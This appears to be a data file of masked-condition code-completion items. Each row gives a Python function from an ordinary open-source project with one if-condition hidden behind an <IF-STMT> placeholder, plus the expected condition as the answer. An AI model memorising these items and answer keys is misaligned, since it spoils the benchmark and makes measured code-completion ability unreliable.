639,"def repack(self):<tab>newNsp = Pfs0Stream(self._path[:-4] + "".nsp"")<tab>for nspF in self.hfs0[""secure""]:<tab><tab>f = newNsp.add(nspF._path, nspF.size)<tab><tab>nspF.rewind()<tab><tab>i = 0<tab><tab>pageSize = 0x10000<tab><tab>while True:<tab><tab><tab>buf = nspF.read(pageSize)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>i += len(buf)<tab><tab><tab>f.write(buf)<tab>newNsp.close()",if len ( buf ) == 0 :,152
640,"def assertHasChanged(self, **kwargs):<tab>tracker = kwargs.pop(""tracker"", self.tracker)<tab>for field, value in kwargs.items():<tab><tab><IF-STMT><tab><tab><tab>with self.assertRaises(FieldError):<tab><tab><tab><tab>tracker.has_changed(field)<tab><tab>else:<tab><tab><tab>self.assertEqual(tracker.has_changed(field), value)",if value is None :,91
641,"def check_engine(engine):<tab>if engine == ""auto"":<tab><tab>if pa is not None:<tab><tab><tab>return ""pyarrow""<tab><tab>elif fastparquet is not None:  # pragma: no cover<tab><tab><tab>return ""fastparquet""<tab><tab>else:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install either pyarrow or fastparquet."")<tab>elif engine == ""pyarrow"":<tab><tab><IF-STMT>  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install pyarrow fisrt."")<tab><tab>return engine<tab>elif engine == ""fastparquet"":<tab><tab>if fastparquet is None:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install fastparquet first."")<tab><tab>return engine<tab>else:  # pragma: no cover<tab><tab>raise RuntimeError(""Unsupported engine {} to read parquet."".format(engine))",if pa is None :,187
642,"def parse_vcs_bundle_file(self, content):<tab>for line in content.splitlines():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>match = re.search(r""^-r\s*([^ ])?"", line)<tab><tab>if not match:<tab><tab><tab>return None, None<tab><tab>rev = match.group(1)<tab><tab>rest = line[match.end() :].strip().split(None, 1)[0]<tab><tab>return rest, rev<tab>return None, None","if not line . strip ( ) or line . strip ( ) . startswith ( ""#"" ) :",127
643,"def __init__(self, parent_instance, *args, **kwargs):<tab>self.parent_instance = parent_instance<tab>self.pk_field = kwargs.pop(""pk_field"", False)<tab>self.to_field = kwargs.pop(""to_field"", None)<tab>if self.parent_instance is not None:<tab><tab><IF-STMT><tab><tab><tab>kwargs[""initial""] = getattr(self.parent_instance, self.to_field)<tab><tab>else:<tab><tab><tab>kwargs[""initial""] = self.parent_instance.pk<tab>kwargs[""required""] = False<tab>kwargs[""widget""] = InlineForeignKeyHiddenInput<tab>super(InlineForeignKeyField, self).__init__(*args, **kwargs)",if self . to_field :,165
644,"def number_multiple_validator(v: ""Number"", field: ""ModelField"") -> ""Number"":<tab>field_type: ConstrainedNumber = field.type_<tab>if field_type.multiple_of is not None:<tab><tab>mod = float(v) / float(field_type.multiple_of) % 1<tab><tab><IF-STMT><tab><tab><tab>raise errors.NumberNotMultipleError(multiple_of=field_type.multiple_of)<tab>return v","if not almost_equal_floats ( mod , 0.0 ) and not almost_equal_floats ( mod , 1.0 ) :",132
645,"def forward(self, x, edge_index, edge_attr=None):<tab>x_old = 0<tab>for i, layer in enumerate(self.hidden_layers):<tab><tab>x = self.dropout(x)<tab><tab>x = layer(x, edge_index)<tab><tab>x = self.norm(x)<tab><tab>x = self.relu(x)<tab><tab><IF-STMT><tab><tab><tab>x = x + x_old<tab><tab><tab>x_old = x<tab>x = self.dropout(x)<tab>x = self.out_layer(x, edge_index)<tab>return x",if self . skip > 0 and i % self . skip == 0 :,154
646,"def check_dimensions(nrow, ncol):<tab>if nrow is not None:<tab><tab><IF-STMT><tab><tab><tab>warn(<tab><tab><tab><tab>""'nrow' must be greater than 0. "" ""Your value has been ignored."",<tab><tab><tab><tab>PlotnineWarning,<tab><tab><tab>)<tab><tab><tab>nrow = None<tab><tab>else:<tab><tab><tab>nrow = int(nrow)<tab>if ncol is not None:<tab><tab>if ncol < 1:<tab><tab><tab>warn(<tab><tab><tab><tab>""'ncol' must be greater than 0. "" ""Your value has been ignored."",<tab><tab><tab><tab>PlotnineWarning,<tab><tab><tab>)<tab><tab><tab>ncol = None<tab><tab>else:<tab><tab><tab>ncol = int(ncol)<tab>return nrow, ncol",if nrow < 1 :,189
647,"def logic():<tab>while 1:<tab><tab>yield clock.posedge, reset.negedge<tab><tab>if reset == ACTIVE_LOW:<tab><tab><tab>count.next = 0<tab><tab>else:<tab><tab><tab>if enable:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>count.next = n - 1<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>count.next = count - 1",if count == - n :,99
648,"def get_whitelist(self, guild: Optional[discord.Guild] = None) -> Set[int]:<tab>async with self._access_lock:<tab><tab>ret: Set[int]<tab><tab>gid: Optional[int] = guild.id if guild else None<tab><tab><IF-STMT><tab><tab><tab>ret = self._cached_whitelist[gid].copy()<tab><tab>else:<tab><tab><tab>if gid is not None:<tab><tab><tab><tab>ret = set(await self._config.guild_from_id(gid).whitelist())<tab><tab><tab>else:<tab><tab><tab><tab>ret = set(await self._config.whitelist())<tab><tab><tab>self._cached_whitelist[gid] = ret.copy()<tab><tab>return ret",if gid in self . _cached_whitelist :,177
649,"def process_response(self, request, response):<tab>if getattr(self, ""has_session"", False):<tab><tab><IF-STMT><tab><tab><tab>user = ""%s (id:%s)"" % (request.user.username, request.user.pk)<tab><tab>else:<tab><tab><tab>user = ""(Anonymous)""<tab><tab>self.logger.info(<tab><tab><tab>""Session %s authenticated by %s"", request.session.session_key, user<tab><tab>)<tab><tab>request.session.save = self._save<tab><tab>self._save = None<tab><tab>self.session = None<tab><tab>self.has_session = False","if getattr ( request , ""user"" , None ) and request . user . is_authenticated ( ) :",163
650,"def cluster(spawnpoints, radius, time_threshold):<tab>clusters = []<tab>diameter = 2 * radius<tab>for p in spawnpoints:<tab><tab>if len(clusters) == 0:<tab><tab><tab>clusters.append(Spawncluster(p))<tab><tab>else:<tab><tab><tab>c = min(clusters, key=lambda x: cost(p, x, time_threshold))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>c.append(p)<tab><tab><tab>else:<tab><tab><tab><tab>c = Spawncluster(p)<tab><tab><tab><tab>clusters.append(c)<tab>return clusters","if check_cluster ( p , c , radius , time_threshold ) :",152
651,"def get_shape(shape):<tab>""""""Convert the shape to correct dtype and vars.""""""<tab>ret = []<tab>for dim in shape:<tab><tab><IF-STMT><tab><tab><tab>if libinfo()[""INDEX_DEFAULT_I64""] == ""ON"":<tab><tab><tab><tab>ret.append(dim)<tab><tab><tab>else:<tab><tab><tab><tab>val = int(dim)<tab><tab><tab><tab>assert val <= np.iinfo(np.int32).max<tab><tab><tab><tab>ret.append(tvm.tir.IntImm(""int32"", val))<tab><tab>elif isinstance(dim, tvm.tir.Any):<tab><tab><tab>ret.append(te.var(""any_dim"", ""int32""))<tab><tab>else:<tab><tab><tab>ret.append(dim)<tab>return ret","if isinstance ( dim , tvm . tir . IntImm ) :",194
652,"def run(self):<tab>queue = self.queue<tab>while True:<tab><tab>if not self.running:<tab><tab><tab>break<tab><tab># Grab our data<tab><tab>callback, requests, fetchTimeout, validityOverride = queue.get()<tab><tab># Grab prices, this is the time-consuming part<tab><tab>if len(requests) > 0:<tab><tab><tab>Price.fetchPrices(requests, fetchTimeout, validityOverride)<tab><tab>wx.CallAfter(callback)<tab><tab>queue.task_done()<tab><tab># After we fetch prices, go through the list of waiting items and call their callbacks<tab><tab>for price in requests:<tab><tab><tab>callbacks = self.wait.pop(price.typeID, None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for callback in callbacks:<tab><tab><tab><tab><tab>wx.CallAfter(callback)",if callbacks :,197
653,def _load_scopes_(self):<tab>if self._model_ is None:<tab><tab>tablemap = self.db._adapter.tables(self.query)<tab><tab><IF-STMT><tab><tab><tab>self._model_ = tablemap.popitem()[1]._model_<tab>if self._model_:<tab><tab>self._scopes_ = self._model_._instance_()._scopes_,if len ( tablemap ) == 1 :,92
654,"def udp_to_tcp(udp_sock, tcp_conn):<tab>while True:<tab><tab>msg, _ = udp_sock.recvfrom(2 ** 16)<tab><tab>log_msg(""read_udp"", msg)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>write_tcp(tcp_conn, msg)",if not msg :,80
655,"def __get_annotations(self):<tab>if not hasattr(self, ""_annotations""):<tab><tab>self._annotations = _retrieve_annotations(<tab><tab><tab>self._adaptor, self._primary_id, self._taxon_id<tab><tab>)<tab><tab>if self._identifier:<tab><tab><tab>self._annotations[""gi""] = self._identifier<tab><tab><IF-STMT><tab><tab><tab>self._annotations[""data_file_division""] = self._division<tab>return self._annotations",if self . _division :,110
656,"def ignore_module(module):<tab>result = False<tab>for check in ignore_these:<tab><tab><IF-STMT><tab><tab><tab>if check[:-1] in module:<tab><tab><tab><tab>result = True<tab><tab>else:<tab><tab><tab>if (os.getcwd() + ""/"" + check + "".py"") == module:<tab><tab><tab><tab>result = True<tab>if result:<tab><tab>print_warning(""Ignoring module: "" + module)<tab>return result","if ""/*"" in check :",108
657,"def find_commands(management_dir):<tab># Modified version of function from django/core/management/__init__.py.<tab>command_dir = os.path.join(management_dir, ""commands"")<tab>commands = []<tab>try:<tab><tab>for f in os.listdir(command_dir):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>elif f.endswith("".py"") and f[:-3] not in commands:<tab><tab><tab><tab>commands.append(f[:-3])<tab><tab><tab>elif f.endswith("".pyc"") and f[:-4] not in commands:<tab><tab><tab><tab>commands.append(f[:-4])<tab>except OSError:<tab><tab>pass<tab>return commands","if f . startswith ( ""_"" ) :",164
658,"def _add_kid(key, x):<tab>if x is None:<tab><tab>kids[key] = None<tab>else:<tab><tab><IF-STMT><tab><tab><tab>x1 = [i for i in x if isinstance(i, TVTKBase)]<tab><tab><tab>if x1:<tab><tab><tab><tab>kids[key] = x1<tab><tab>elif isinstance(x, TVTKBase):<tab><tab><tab>if hasattr(x, ""__iter__""):<tab><tab><tab><tab># Don't add iterable objects that contain non<tab><tab><tab><tab># acceptable nodes<tab><tab><tab><tab>if len(list(x)) and isinstance(list(x)[0], TVTKBase):<tab><tab><tab><tab><tab>kids[key] = x<tab><tab><tab>else:<tab><tab><tab><tab>kids[key] = x","if type ( x ) in ( type ( [ ] ) , type ( ( ) ) ) :",196
659,"def classify(self, url, text):<tab>for match in self.rules.match(data=text):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>self.matches.append((url, match))<tab><tab>if self.discard_url_match(url, match):  # pragma: no cover<tab><tab><tab>continue<tab><tab>self.handle_match_etags(match)<tab><tab>rule = match.rule<tab><tab>meta = match.meta<tab><tab>tags = "","".join(["" "".join(t.split(""_"")) for t in match.tags])<tab><tab>log.ThugLogging.log_classifier(""text"", url, rule, tags, meta)<tab>for c in self.custom_classifiers:<tab><tab>self.custom_classifiers[c](url, text)","if ( url , match ) in self . matches :",186
660,"def recurse(node):<tab>for child in node.childNodes:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if child.nodeName.upper() == ""H1"":<tab><tab><tab>return child<tab><tab>if child not in visited:<tab><tab><tab>return recurse(child)",if child . nodeType != child . ELEMENT_NODE :,76
661,"def try_fix_ip_range(self):<tab>for i in range(len(self.fake_ip_parts)):<tab><tab><IF-STMT><tab><tab><tab>if i - 1 < 0:<tab><tab><tab><tab>raise Exception(""Fake IP's out of range."")<tab><tab><tab>self.fake_ip_parts[i - 1] += 1<tab><tab><tab>self.fake_ip_parts[i] = 1",if self . fake_ip_parts [ i ] > 256 :,106
662,"def run(self):<tab>self.thread.start()<tab>while self.thread.isRunning():<tab><tab><IF-STMT><tab><tab><tab>self.update.emit(config.imager_percentage)<tab><tab>if not self.thread.isFinished() and config.percentage == 100:<tab><tab><tab>config.imager_status_text = """"<tab><tab><tab>self.status.emit(""Please wait..."")<tab><tab>time.sleep(0.1)<tab>self.update.emit(100)<tab>self.update.emit(0)<tab>if self.thread.isFinished():<tab><tab>config.status_text = """"<tab><tab>self.finished.emit()<tab>return",if config . imager_percentage :,161
663,"def _get_trading_minutes(self, trading_date):<tab>trading_minutes = set()<tab>for account_type in self._config.base.accounts:<tab><tab><IF-STMT><tab><tab><tab>trading_minutes = trading_minutes.union(<tab><tab><tab><tab>self._get_stock_trading_minutes(trading_date)<tab><tab><tab>)<tab><tab>elif account_type == DEFAULT_ACCOUNT_TYPE.FUTURE:<tab><tab><tab>trading_minutes = trading_minutes.union(<tab><tab><tab><tab>self._get_future_trading_minutes(trading_date)<tab><tab><tab>)<tab>return sorted(list(trading_minutes))",if account_type == DEFAULT_ACCOUNT_TYPE . STOCK :,169
664,"def lngettext(self, msgid1, msgid2, n):<tab>import warnings<tab>warnings.warn(<tab><tab>""lngettext() is deprecated, use ngettext() instead"", DeprecationWarning, 2<tab>)<tab>try:<tab><tab>tmsg = self._catalog[(msgid1, self.plural(n))]<tab>except KeyError:<tab><tab>if self._fallback:<tab><tab><tab>return self._fallback.lngettext(msgid1, msgid2, n)<tab><tab><IF-STMT><tab><tab><tab>tmsg = msgid1<tab><tab>else:<tab><tab><tab>tmsg = msgid2<tab>if self._output_charset:<tab><tab>return tmsg.encode(self._output_charset)<tab>return tmsg.encode(locale.getpreferredencoding())",if n == 1 :,176
665,"def check_langs(langs, pairs):<tab>messages = []<tab>for src, tgt in pairs:<tab><tab><IF-STMT><tab><tab><tab>messages.append(<tab><tab><tab><tab>f""language pair {src}-{tgt} contains languages ""<tab><tab><tab><tab>""that are not in the language dictionary""<tab><tab><tab>)<tab>if len(messages) > 0:<tab><tab>raise ValueError("" "".join(messages) + f""; langs: {langs}"")",if src not in langs or tgt not in langs :,114
666,"def to_header(self):<tab>""""""Converts the object back into an HTTP header.""""""<tab>ranges = []<tab>for begin, end in self.ranges:<tab><tab><IF-STMT><tab><tab><tab>ranges.append(f""{begin}-"" if begin >= 0 else str(begin))<tab><tab>else:<tab><tab><tab>ranges.append(f""{begin}-{end - 1}"")<tab>return f""{self.units}={','.join(ranges)}""",if end is None :,100
667,"def name(ent, langpref=""en""):<tab>try:<tab><tab>org = ent[""organization""]<tab>except KeyError:<tab><tab>return None<tab>for info in [""organization_display_name"", ""organization_name"", ""organization_url""]:<tab><tab>try:<tab><tab><tab>for item in org[info]:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return item[""text""]<tab><tab>except KeyError:<tab><tab><tab>pass<tab>return None","if item [ ""lang"" ] == langpref :",112
668,"def check_url(value):<tab>validate(text, value)<tab>parsed = urlparse(value)<tab>if not parsed.netloc:<tab><tab>raise ValueError(""'{0}' is not a valid URL"".format(value))<tab>for name, schema in attributes.items():<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""Invalid URL attribute '{0}'"".format(name))<tab><tab>try:<tab><tab><tab>validate(schema, _getattr(parsed, name))<tab><tab>except ValueError as err:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Unable to validate URL attribute '{0}': {1}"".format(name, err)<tab><tab><tab>)<tab>return True","if not _hasattr ( parsed , name ) :",158
669,"def stepStarted(self, step):<tab>self.currentStep = step<tab>for w in self.watchers:<tab><tab>receiver = w.stepStarted(self, step)<tab><tab><IF-STMT><tab><tab><tab>if isinstance(receiver, type(())):<tab><tab><tab><tab>step.subscribe(receiver[0], receiver[1])<tab><tab><tab>else:<tab><tab><tab><tab>step.subscribe(receiver)<tab><tab><tab>d = step.waitUntilFinished()<tab><tab><tab># TODO: This actually looks like a bug, but this code<tab><tab><tab># will be removed anyway.<tab><tab><tab># pylint: disable=cell-var-from-loop<tab><tab><tab>d.addCallback(lambda step: step.unsubscribe(receiver))<tab>step.waitUntilFinished().addCallback(self._stepFinished)",if receiver :,183
670,"def assert_not_none(obj, msg=None, values=True):<tab>""""""Fail the test if given object is None.""""""<tab>_msg = ""is None""<tab>if obj is None:<tab><tab><IF-STMT><tab><tab><tab>msg = _msg<tab><tab>elif values is True:<tab><tab><tab>msg = ""%s: %s"" % (msg, _msg)<tab><tab>_report_failure(msg)",if msg is None :,99
671,"def _parse_date_fmt():<tab>fmt = get_format(""DATE_FORMAT"")<tab>escaped = False<tab>for char in fmt:<tab><tab>if escaped:<tab><tab><tab>escaped = False<tab><tab><IF-STMT><tab><tab><tab>escaped = True<tab><tab>elif char in ""Yy"":<tab><tab><tab>yield ""year""<tab><tab>elif char in ""bEFMmNn"":<tab><tab><tab>yield ""month""<tab><tab>elif char in ""dj"":<tab><tab><tab>yield ""day""","elif char == ""\\"" :",117
672,"def GetPluginClass(self):<tab>if self.plugin_name:<tab><tab>plugin_cls = registry.OutputPluginRegistry.PluginClassByName(self.plugin_name)<tab><tab><IF-STMT><tab><tab><tab>logging.warning(""Unknown output plugin %s"", self.plugin_name)<tab><tab><tab>return registry.OutputPluginRegistry.PluginClassByName(<tab><tab><tab><tab>""UnknownOutputPlugin""<tab><tab><tab>)<tab><tab>return plugin_cls",if plugin_cls is None :,109
673,"def command(self):<tab>config = self.session.config<tab>unregister = False<tab>self.session.ui.notify(_(""Watching logs: Press CTRL-C to return to the CLI""))<tab>try:<tab><tab>while not mailpile.util.QUITTING and not config.event_log:<tab><tab><tab>time.sleep(1)<tab><tab>unregister = config.event_log and config.event_log.ui_watch(self.session.ui)<tab><tab>self.session.ui.unblock(force=True)<tab><tab>while not mailpile.util.QUITTING:<tab><tab><tab>time.sleep(1)<tab>except KeyboardInterrupt:<tab><tab>pass<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>config.event_log.ui_unwatch(self.session.ui)<tab>return self._success(_(""That was fun!""))",if unregister :,197
674,"def delete_rule(self, arn):<tab>for load_balancer_arn in self.load_balancers:<tab><tab>listeners = self.load_balancers.get(load_balancer_arn).listeners.values()<tab><tab>for listener in listeners:<tab><tab><tab>for rule in listener.rules:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>listener.remove_rule(rule)<tab><tab><tab><tab><tab>return",if rule . arn == arn :,104
675,"def __dragBegin(self, widget, event):<tab>if event.buttons & (event.Buttons.Left | event.Buttons.Middle):<tab><tab>GafferUI.Pointer.setCurrent(""nodes"")<tab><tab><IF-STMT><tab><tab><tab>return next(iter(self.__graphComponents))<tab><tab>else:<tab><tab><tab>return Gaffer.StandardSet(self.__graphComponents)<tab>return None",if len ( self . __graphComponents ) == 1 :,103
676,"def _get_strategy_name(self):<tab>frame = sys._getframe()<tab>while frame:<tab><tab>st = frame.f_locals.get(""self"")<tab><tab><IF-STMT><tab><tab><tab>return ""%s.%s"" % (type(st).__module__, type(st).__name__)<tab><tab>frame = frame.f_back<tab>return """"","if isinstance ( st , StrategyBase ) :",88
677,"def getCommitFromFile(short=True):<tab>global _gitdir<tab>branch = getBranchFromFile()<tab>commit = None<tab>if _gitdir and branch:<tab><tab>if branch == ""HEAD"":<tab><tab><tab>commitFile = os.path.join(_gitdir, ""HEAD"")<tab><tab>else:<tab><tab><tab>commitFile = os.path.join(_gitdir, ""refs"", ""heads"", branch)<tab><tab><IF-STMT><tab><tab><tab>with open(commitFile, ""r"", encoding=""utf-8"") as f:<tab><tab><tab><tab>commit = f.readline().strip()<tab>if short and commit:<tab><tab>return commit[:8]<tab>else:<tab><tab>return commit",if os . path . isfile ( commitFile ) :,169
678,"def _register_aliases_from_pack(self, pack, aliases):<tab>registered_count = 0<tab>for alias in aliases:<tab><tab>try:<tab><tab><tab>LOG.debug(""Loading alias from %s."", alias)<tab><tab><tab>self._register_action_alias(pack, alias)<tab><tab>except Exception as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>msg = 'Failed to register alias ""%s"" from pack ""%s"": %s' % (<tab><tab><tab><tab><tab>alias,<tab><tab><tab><tab><tab>pack,<tab><tab><tab><tab><tab>str(e),<tab><tab><tab><tab>)<tab><tab><tab><tab>raise ValueError(msg)<tab><tab><tab>LOG.exception(""Unable to register alias: %s"", alias)<tab><tab><tab>continue<tab><tab>else:<tab><tab><tab>registered_count += 1<tab>return registered_count",if self . _fail_on_failure :,199
679,"def pop_many(self, limit=None):<tab>if limit is None:<tab><tab>limit = DEFAULT_SYNC_OFFLINE_ACTIVITY<tab>heartbeats = []<tab>count = 0<tab>while count < limit:<tab><tab>heartbeat = self.pop()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>heartbeats.append(heartbeat)<tab><tab>count += 1<tab><tab>if count % HEARTBEATS_PER_REQUEST == 0:<tab><tab><tab>yield heartbeats<tab><tab><tab>heartbeats = []<tab>if heartbeats:<tab><tab>yield heartbeats",if not heartbeat :,140
680,"def makeChunkVertices(self, chunk):<tab>if (<tab><tab>chunk.root_tag<tab><tab>and ""Level"" in chunk.root_tag<tab><tab>and ""TileTicks"" in chunk.root_tag[""Level""]<tab>):<tab><tab>ticks = chunk.root_tag[""Level""][""TileTicks""]<tab><tab><IF-STMT><tab><tab><tab>self.vertexArrays.append(<tab><tab><tab><tab>self._computeVertices(<tab><tab><tab><tab><tab>[[t[i].value for i in ""xyz""] for t in ticks],<tab><tab><tab><tab><tab>(0xFF, 0xFF, 0xFF, 0x44),<tab><tab><tab><tab><tab>chunkPosition=chunk.chunkPosition,<tab><tab><tab><tab>)<tab><tab><tab>)<tab>yield",if len ( ticks ) :,175
681,"def read_bytes_from_url(url: str, optional=False) -> bytes:<tab>if parse_args().print_commands:<tab><tab>print_stderr(color_line(""=> "", 14) + f""GET {url}"")<tab>req = request.Request(url)<tab>try:<tab><tab>response = request.urlopen(req)<tab>except URLError as exc:<tab><tab>print_error(""urllib: "" + str(exc.reason))<tab><tab><IF-STMT><tab><tab><tab>return b""""<tab><tab>if ask_to_continue(_(""Do you want to retry?"")):<tab><tab><tab>return read_bytes_from_url(url, optional=optional)<tab><tab>raise SysExit(102)<tab>result_bytes = response.read()<tab>return result_bytes",if optional :,178
682,"def h2i(self, pkt, x):<tab>if x is not None:<tab><tab>if x <= -180.00000005:<tab><tab><tab>warning(""Fixed3_7: Input value too negative: %.8f"" % x)<tab><tab><tab>x = -180.0<tab><tab><IF-STMT><tab><tab><tab>warning(""Fixed3_7: Input value too positive: %.8f"" % x)<tab><tab><tab>x = 180.0<tab><tab>x = int(round((x + 180.0) * 1e7))<tab>return x",elif x >= 180.00000005 :,132
683,"def replace_incompatible_files():<tab>for filename, version_info in PYTHON_VERSION_REQUIREMENTS.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>version = ""."".join(str(v) for v in version_info)<tab><tab>code = INCOMPATIBLE_PYTHON_VERSION_PLACEHOLDER.format(version=version)<tab><tab>with open(filename, ""w"") as f:<tab><tab><tab>f.write(code)",if sys . version_info >= version_info :,110
684,"def __eq__(self, other):<tab>if self.__class__ != other.__class__:<tab><tab>return False<tab>for attr in [""bar"", ""baz"", ""quux""]:<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>elif getattr(self, attr, None) != getattr(other, attr, None):<tab><tab><tab>return False<tab>return True","if hasattr ( self , attr ) != hasattr ( other , attr ) :",95
685,"def get_content_length(download):<tab>try:<tab><tab>meta = download.info()<tab><tab>if hasattr(meta, ""getheaders"") and hasattr(meta.getheaders, ""Content-Length""):<tab><tab><tab>return int(meta.getheaders(""Content-Length"")[0])<tab><tab>elif hasattr(download, ""getheader"") and download.getheader(""Content-Length""):<tab><tab><tab>return int(download.getheader(""Content-Length""))<tab><tab><IF-STMT><tab><tab><tab>return int(meta.getheader(""Content-Length""))<tab>except Exception:<tab><tab>pass<tab>return 0","elif hasattr ( meta , ""getheader"" ) and meta . getheader ( ""Content-Length"" ) :",149
686,"def set_size(self, size):<tab>assert len(size) == 2<tab>width, height = size<tab>if width == -1:<tab><tab>for button in self._buttons_list:<tab><tab><tab>cur_width = button.GetSize()[self.WIDTH]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>width = cur_width<tab>if height == -1:<tab><tab>for button in self._buttons_list:<tab><tab><tab>cur_height = button.GetSize()[self.HEIGHT]<tab><tab><tab>if cur_height > height:<tab><tab><tab><tab>height = cur_height<tab>if self._squared:<tab><tab>width = height = width if width > height else height<tab>for button in self._buttons_list:<tab><tab>button.SetMinSize((width, height))",if cur_width > width :,187
687,"def _default_config(self):<tab>if sys.platform.startswith(""win""):<tab><tab>return {""name"": ""Command Prompt"", ""cmd"": ""cmd.exe"", ""env"": {}}<tab>else:<tab><tab>if ""SHELL"" in os.environ:<tab><tab><tab>shell = os.environ[""SHELL""]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cmd = [shell, ""-l""]<tab><tab><tab>else:<tab><tab><tab><tab>cmd = [shell, ""-i"", ""-l""]<tab><tab>else:<tab><tab><tab>cmd = [""/bin/bash"", ""-i"", ""-l""]<tab><tab>return {""name"": ""Login Shell"", ""cmd"": cmd, ""env"": {}}","if os . path . basename ( shell ) == ""tcsh"" :",170
688,"def log_sock(s, event_type=None):<tab>if sock_silent:<tab><tab>pass<tab>else:<tab><tab>if event_type is None:<tab><tab><tab>logsocket.sendto(ensure_str(s), (host, port))<tab><tab><IF-STMT><tab><tab><tab>logsocket.sendto(ensure_str(s), (host, port))<tab><tab>else:<tab><tab><tab>pass",elif event_type in show_event :,103
689,"def check_eventref_citations(self, obj):<tab>if obj:<tab><tab>for event_ref in obj.get_event_ref_list():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return True<tab><tab><tab>event = self.dbstate.db.get_event_from_handle(event_ref.ref)<tab><tab><tab>if self.check_event_citations(event):<tab><tab><tab><tab>return True<tab>return False",if self . check_attribute_citations ( event_ref ) :,116
690,"def __exit__(self, exc_type, exc_value, traceback):<tab>self.nest -= 1<tab>if self.nest == 0:<tab><tab>try:<tab><tab><tab>self.con.__exit__(exc_type, exc_value, traceback)<tab><tab><tab>self.close()<tab><tab>except Exception as exc:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.debug.write(""EXCEPTION from __exit__: {}"".format(exc))<tab><tab><tab>raise",if self . debug :,109
691,"def construct_instances(self, row, keys=None):<tab>collected_models = {}<tab>for i, (key, constructor, attr, conv) in enumerate(self.column_map):<tab><tab>if keys is not None and key not in keys:<tab><tab><tab>continue<tab><tab>value = row[i]<tab><tab><IF-STMT><tab><tab><tab>collected_models[key] = constructor()<tab><tab>instance = collected_models[key]<tab><tab>if attr is None:<tab><tab><tab>attr = self.cursor.description[i][0]<tab><tab>if conv is not None:<tab><tab><tab>value = conv(value)<tab><tab>setattr(instance, attr, value)<tab>return collected_models",if key not in collected_models :,167
692,"def delete(self):<tab>""""""Completely shut down pulseaudio client.""""""<tab>if self._pa_context is not None:<tab><tab>assert _debug(""PulseAudioContext.delete"")<tab><tab><IF-STMT><tab><tab><tab>pa.pa_context_disconnect(self._pa_context)<tab><tab><tab>while self.state is not None and not self.is_terminated:<tab><tab><tab><tab>self.wait()<tab><tab>self._disconnect_callbacks()<tab><tab>pa.pa_context_unref(self._pa_context)<tab><tab>self._pa_context = None",if self . is_ready :,136
693,"def _hstack(self, other, prefix=None):<tab>""""""Join the columns of the other DataFrame to this one, assuming the ordering is the same""""""<tab>assert len(self) == len(<tab><tab>other<tab>), ""does not make sense to horizontally stack DataFrames with different lengths""<tab>for name in other.get_column_names():<tab><tab><IF-STMT><tab><tab><tab>new_name = prefix + name<tab><tab>else:<tab><tab><tab>new_name = name<tab><tab>self.add_column(new_name, other.columns[name])",if prefix :,127
694,"def smart_linkflags(source, target, env, for_signature):<tab>if cplusplus.iscplusplus(source):<tab><tab>build_dir = env.subst(""$BUILDDIR"", target=target, source=source)<tab><tab><IF-STMT><tab><tab><tab>return ""-qtempinc="" + os.path.join(build_dir, ""tempinc"")<tab>return """"",if build_dir :,91
695,"def read(self, size):<tab>x = len(self.buf)<tab>while x < size:<tab><tab>raw = self.fileobj.read(self.blocksize)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>data = self.bz2obj.decompress(raw)<tab><tab>self.buf += data<tab><tab>x += len(data)<tab>buf = self.buf[:size]<tab>self.buf = self.buf[size:]<tab>self.pos += len(buf)<tab>return buf",if not raw :,120
696,"def set_ok_verifiability(self, cookie, request):<tab>if request.unverifiable and is_third_party(request):<tab><tab>if cookie.version > 0 and self.strict_rfc2965_unverifiable:<tab><tab><tab>_debug(""   third-party RFC 2965 cookie during "" ""unverifiable transaction"")<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>_debug(""   third-party Netscape cookie during "" ""unverifiable transaction"")<tab><tab><tab>return False<tab>return True",elif cookie . version == 0 and self . strict_ns_unverifiable :,138
697,"def update_sockets(self, context):<tab>bools = [self.min_list, self.max_list, self.size_list]<tab>dims = int(self.dimensions[0])<tab>for i in range(3):<tab><tab>for j in range(3):<tab><tab><tab>out_index = 4 + j + 3 * i<tab><tab><tab>hidden = self.outputs[out_index].hide_safe<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if hidden:<tab><tab><tab><tab><tab>self.outputs[out_index].hide_safe = False<tab><tab><tab>else:<tab><tab><tab><tab>self.outputs[out_index].hide_safe = True<tab><tab>updateNode(self, context)",if bools [ i ] [ j ] and j < dims :,173
698,"def hash_of_file(path):<tab>""""""Return the hash of a downloaded file.""""""<tab>with open(path, ""r"") as archive:<tab><tab>sha = sha256()<tab><tab>while True:<tab><tab><tab>data = archive.read(2 ** 20)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>sha.update(data)<tab>return encoded_hash(sha)",if not data :,95
